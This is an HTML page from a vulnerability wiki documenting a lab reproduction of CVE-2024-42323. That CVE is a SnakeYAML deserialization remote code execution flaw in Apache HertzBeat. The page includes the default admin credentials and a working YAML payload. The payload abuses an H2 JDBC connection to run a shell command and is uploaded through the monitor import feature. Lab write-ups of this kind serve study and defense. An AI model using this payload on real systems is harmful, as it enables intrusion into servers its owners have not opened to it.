<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/hertzbeat/CVE-2024-42323/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../h2database/CVE-2022-23221/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../h2database/CVE-2022-23221/README.zh-cn/" class="btn btn-xs btn-link">
        H2 Database Web Console未授权JDBC攻击导致远程代码执行（CVE-2022-23221）
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-hertzbeat-snakeyaml-deserialization-remote-code-execution-cve-2024-42323">Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323)<a class="headerlink" href="#apache-hertzbeat-snakeyaml-deserialization-remote-code-execution-cve-2024-42323" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache HertzBeat is an open-source real-time monitoring and alarm tool that supports monitoring of operating systems, middleware, databases, and more through its web interface.</p>
<p>In versions prior to 1.6.0, HertzBeat uses a vulnerable version of SnakeYAML library for parsing YAML files. When authenticated users import new monitoring types through the <code>/api/monitors/import</code> or <code>/api/alert/defines/import</code> APIs, they can provide specially crafted YAML content that triggers deserialization of untrusted data, potentially leading to remote code execution on the target system.</p>
<p>References:</p>
<ul>
<li><a href="https://forum.butian.net/article/612">https://forum.butian.net/article/612</a></li>
<li><a href="https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx">https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx</a></li>
<li><a href="https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md">https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start a vulnerable HertzBeat 1.4.4 instance:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the service is started, you can access the HertzBeat dashboard at <code>http://your-ip:1157/dashboard</code>. The default login credentials are:</p>
<ul>
<li>Username: <code>admin</code></li>
<li>Password: <code>hertzbeat</code></li>
</ul>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>First prepare a malicious YAML file that filename ends with <code>.yaml</code>:</p>
<div class="highlight"><pre><span></span><code><span class="kt">!!org.h2.jdbc.JdbcConnection</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="w"> </span><span class="s">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop</span><span class="nv"> </span><span class="s">alias</span><span class="nv"> </span><span class="s">if</span><span class="nv"> </span><span class="s">exists</span><span class="nv"> </span><span class="s">exec\\;CREATE</span><span class="nv"> </span><span class="s">ALIAS</span><span class="nv"> </span><span class="s">EXEC</span><span class="nv"> </span><span class="s">AS</span><span class="nv"> </span><span class="s">$$void</span><span class="nv"> </span><span class="s">exec()</span><span class="nv"> </span><span class="s">throws</span><span class="nv"> </span><span class="s">java.io.IOException</span><span class="nv"> </span><span class="s">{</span><span class="nv"> </span><span class="s">Runtime.getRuntime().exec(\&quot;touch</span><span class="nv"> </span><span class="s">/tmp/success\&quot;)\\;</span><span class="nv"> </span><span class="s">}$$\\;CALL</span><span class="nv"> </span><span class="s">EXEC</span><span class="nv"> </span><span class="s">()\\;&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="p p-Indicator">[],</span><span class="w"> </span><span class="s">&quot;a&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;b&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">false</span><span class="w"> </span><span class="p p-Indicator">]</span>
</code></pre></div>
<p>Then log into the HertzBeat dashboard, navigate to any monitor page and locate the import button. The interface allows users to import monitor configurations through YAML files, upload the malicious YAML file:</p>
<p><img alt="Locate the import button" src="1.png" /></p>
<p>When the malicious YAML file is imported through the web interface, HertzBeat will attempt to deserialize its contents, triggering the remote code execution:</p>
<p><img alt="Import the malicious YAML file" src="2.png" /></p>
<p>If successful, the payload will execute on the target system. In this example, we can verify the execution by checking for the presence of a newly created file in the container:</p>
<p><img alt="Verify code execution" src="3.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../h2database/CVE-2022-23221/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../h2database/CVE-2022-23221/README.zh-cn/" class="btn btn-xs btn-link">
        H2 Database Web Console未授权JDBC攻击导致远程代码执行（CVE-2022-23221）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>